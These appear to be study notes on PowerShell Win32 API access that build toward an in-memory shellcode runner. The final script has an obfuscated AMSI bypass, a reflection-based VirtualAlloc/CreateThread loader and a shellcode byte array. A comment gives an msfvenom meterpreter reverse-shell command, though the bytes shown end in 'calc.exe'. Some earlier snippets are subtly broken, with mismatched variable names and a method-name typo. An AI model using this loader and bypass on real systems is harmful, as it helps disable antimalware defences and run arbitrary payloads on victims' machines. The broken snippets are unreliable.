# Add-Type

The `Add-Type` keyword allows us to run C# code containing Win32 API declarations and then call them

This compilation is done by `csc.exe` 

This process writes the source code and the resulting .NET assembly to disk

Open process monitor and monitor for `powershell_ise.exe`

Paste the following code to the ISE:
```powershell
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
	[DllImport("user32.dll", CharSet=CharSet.Auto)]
	public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
}
"@

Add-Type $User32
[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```

You can see that it writes to a temporary directory on disk:

![[Pasted image 20230614215101.png]]

## List loaded assemblies in a process

```powershell
[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
```

We can see that `kintimsn` is loaded
![[Pasted image 20230614215601.png]]

# Keeping it in memory by leveraging unsafe methods

To look for functions in unmanaged code, we can use the `DllImport` and the `Add-Type` keywords.

But `Add-Type` writes to disk.

We can use `Dynamic Lookup`

To do Dynamic Lookup, we use 2 windows APIs `GetModuleHandle` and `GetProcAddress`

Since we can't create a .NET assembly, we need to locate ones that we can reuse.

We use the following to find Assemblies that contain the `Unsafe` types:
```powershell
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$Assemblies |
	ForEach-Object {
		$_.GetTypes() |
			ForEach-Object {
				$_ | Get-Member -Static | Where-Object {
					$_.TypeName.Contains('Unsafe')
				}
			} 2> $null
	}
```

Now locate an Assembly that contains `GetModuleHandle` and `GetProcAddress`:
```powershell
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$Assemblies |
	ForEach-Object {
		$_.Location
		$_.GetTypes() |
			ForEach-Object {
				$_ | Get-Member -Static | Where-Object {
					$_.TypeName.Equal('Microsoft.Win32.UnsafeNativeMethods')
				}
			} 2> $null
	}
```

Since we cannot interact with the `System.dll` assembly directly, we must obtain a reference to it using the `GetType` method
```powershell
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
	$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') })
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')

# Obtain base address of an unmanaged DLL
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll"))

# Since the following comment returns multiple instances of GetProcAddress
# $GetProcAddress = $unsafeObj.GetMethod('GetProcAddress')
# We can get all of them at once, and create an array to hold all of them
$tmp=@()
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[0]
$GetProcAddress.Invoke($null, @($user32, "MessageBoxA"))
```

Now we recycle that into a method for multiple usage:
```powershell
function LookupFunc {
	Param($modulename, $functionName)
	$assembly = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
	$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp = @()

	$assembly.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assembly.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

$MessageBoxA = LookupFunc user32.dll MessageBoxA
```

Now that we can resolve addresses of DLLs and APIs, we must define the Argument Type

The defined argument type, must be paired to the resolved function

We can do this with `GetDelegateForFunctionPointer` 

Which receives the address of a function and its matching delegate (function prototype)

We can create Delegate Types using reflection:
```powershell
# Define a function called LookupFunc that takes two parameters, moduleName and functionName
function LookupFunc {
    Param($modulename, $functionName)

    # Gets the list of currently loaded assemblies and filters to find 'System.dll'
    $assembly = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
        $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    # Creates an empty array to hold the function pointers
    $tmp = @()

    # Enumerate through each method in the assembly 
    # and add the GetProcAddress method (if found) to the $tmp array
    $assembly.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}

    # Returns the GetProcAddress function pointer of the specified module and function
    return $tmp[0].Invoke($null, @(($assembly.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

# Calls the LookupFunc to get a function pointer to the MessageBoxA function in the user32.dll library
$MessageBoxA = LookupFunc 'user32.dll' 'MessageBoxA'

# Creates a new assembly with the name 'ReflectedDelegate'
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')

# Gets the current application domain 
$Domain = [AppDomain]::CurrentDomain

# Defines a dynamic assembly in the current application domain with the assembly name and access attributes
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

# Defines a dynamic module in the dynamic assembly with the name 'InMemoryModule'
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

# Defines a type (class) in the dynamic module with specific attributes
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

# Defines a constructor for the dynamic type with specific attributes and parameter types
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr], [String], [String], [int]))
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')

# Defines a method for the dynamic type with specific attributes and parameter types
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [int], @([IntPtr], [String], [String], [int]))
$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')

# Finalizes the type definition and returns a Type object that can be used to access the newly created type
$MyDelegateType = $MyTypeBuilder.CreateType()

# Gets a delegate that can be used to call the function pointer retrieved earlier, this involves marshalling the function pointer to our custom delegate type
$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)

# Invokes the function through the delegate with specified parameters, which is the equivalent of calling the MessageBoxA function in user32.dll library with these parameters
$MyFunction.Invoke([IntPtr]::Zero, "Hello World", "This is My MessageBox", 0)
```

# Now Import Needed APIs for Injection

## Get VirtualAlloc Example
```powershell
function LookupFunc {
	Param ($moduleName, $functionName)
	
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp = @()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$temp+=$_}}
	return $temp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
	
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	
    # Create Custom Assembly and Define Module and Type
	$type = [AppDomain]::CurrentDomain.
	DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
 [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
 
    # Set up constructor
	$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
     SetImplementationFlags('Runtime, Managed')
   
   $tpye.
   DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
   
   return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
```

## Shellcode Runner
```powershell
# Compact AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)

# Shellcode loader >:]
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Allocate executable memory
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Copy shellcode to allocated memory
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f powershell
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,0x1,0x8d,0x85,0xb2,0x0,0x0,0x0,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x0
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# Execute shellcode and wait for it to exit
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
```